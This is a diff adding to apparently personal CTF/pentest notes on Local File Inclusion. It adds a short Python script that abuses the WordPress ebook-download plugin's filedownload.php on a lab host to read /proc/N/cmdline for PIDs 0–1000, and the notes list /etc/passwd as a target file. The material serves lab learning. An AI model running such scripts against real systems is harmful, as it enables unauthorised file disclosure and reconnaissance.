@@ -1,5 +1,22 @@
 # Local File Inclusion
 #lfi
+
+
+## List running processes
+```
+import requests
+
+
+for num in range(0, 1001):
+    url = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{}/cmdline'.format(num)
+    # print(url)
+    r = requests.get(url)
+	# Filter - adjust as necessary!
+    if not 'cmdline<script>'.encode('UTF-8') in r.content:
+        print(r.content)
+```
+
+## File list
 - Fingerprinting (General files)
 
     /etc/passwd
